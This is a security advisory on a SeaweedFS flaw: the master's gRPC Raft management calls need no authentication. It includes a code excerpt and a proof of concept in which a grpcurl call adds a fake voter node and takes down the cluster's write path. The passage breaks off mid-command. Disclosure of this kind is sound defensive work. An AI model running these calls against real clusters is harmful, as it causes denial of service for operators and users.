title: Unauthenticated Raft cluster membership manipulation causes master denial of service
summary:
### Summary
An unauthenticated attacker who can reach a SeaweedFS master gRPC port can add a fake, unreachable node to the live Raft cluster and take down the write path of the whole cluster. The master exposes RaftAddServer, RaftRemoveServer, and RaftLeadershipTransfer over gRPC with no caller authentication or authorization check of any kind. On a cluster running the documented multi master HA configuration, the hashicorp raft backend, a single unauthenticated RaftAddServer call inserted a phantom voter the real master could never reach. Within seconds the master lost Raft leadership, and every subsequent Assign call, the RPC that filers, the S3 gateway, and every client use to get a write location, started failing.

### Details
weed/server/master_grpc_server_raft.go implements RaftAddServer, RaftRemoveServer, and RaftLeadershipTransfer. None of the three call any authentication function. The only guard present is a raft leadership check, which does not verify caller identity at all.

```go
// weed/server/master_grpc_server_raft.go:62
func (ms *MasterServer) RaftAddServer(ctx context.Context, req *master_pb.RaftAddServerRequest) (*master_pb.RaftAddServerResponse, error) {
    ...
    if ms.Topo.HashicorpRaft.State() != raft.Leader {
        return nil, fmt.Errorf("raft add server %s failed: %s is no current leader", req.Id, ...)
    }
    idxFuture = ms.Topo.HashicorpRaft.AddVoter(raft.ServerID(req.Id), raft.ServerAddress(req.Address), 0, 0)
```

gRPC server reflection is also enabled by default on the master port, so the full RPC surface, including these raft management calls, is discoverable with zero credentials before an attacker even needs to know the method names.

RaftRemoveServer, at line 89 of the same file, has the identical shape. Only the leadership check gates it, so an attacker who knows or guesses a real peer id could evict a legitimate voter with the same lack of auth. This was confirmed by static review, not separately fire tested.

In the default single master deployment the master runs the legacy raft backend and ms.Topo.HashicorpRaft is nil, so these three RPCs return an empty response and do nothing. The vulnerability only manifests when the operator runs the hashicorp raft backend, -master.raftHashicorp=true, which is what the SeaweedFS documentation recommends for any multi master or highly available deployment. The deployments that most need continuous availability are exactly the ones exposed.

### PoC
Built seaweedfs from the main branch and started a master with the documented HA bootstrap flags:
```
weed server -dir=<datadir> -ip=127.0.0.1 -master.port=9333 -volume.port=8080 -filer=false -s3=false -master.raftHashicorp=true -master.raftBootstrap=true
```
Control call, confirms the cluster is healthy with one real voter:
```
$ grpcurl -plaintext -d '{}' 127.0.0.1:19333 master_pb.Seaweed/RaftListClusterServers
{"clusterServers":[{"id":"127.0.0.1:9333","address":"127.0.0.1:19333","suffrage":"Voter","isLeader":true}]}
```
Attack call, zero credentials, no TLS, no token:
```
$ grpcurl -plaintext -d '{"id":"evil-attacker-node","address":"10.13.37.66:19333","voter":true}' 127.0.0.1:19333 master_pb.Seaweed/RaftAddServer
{}
```
Verification, the fake voter is now a permanent member of the raft configuration:
```
$ grpcurl -plaintext -d '{}' 127.0.0.1:19333 master_pb.Seaweed/RaftListClusterServers
{"clusterServers":[{"id":"127.0.0.1:9333","isLeader":true},{"id":"evil-attacker-node","address":"10.13.37.66:19333","suffrage":"Voter"}]}
```
Master log immediately after the call, showing loss of quorum and leadership:
```
raft: failed to make requestVote RPC: target="{Voter evil-attacker-node 10.13.37.66:19333}" error="...i/o timeout..." term=3
raft: failed to heartbeat to: peer=10.13.37.66:19333 ...
is leader false change event: 127.0.0.1:9333.19333 =>
```
Cluster impact check, the master can no longer serve the RPC every client depends on:
```
$ grpcurl -plaintext -d '{"count":1}' 127.0.0.1:19333 master_pb....
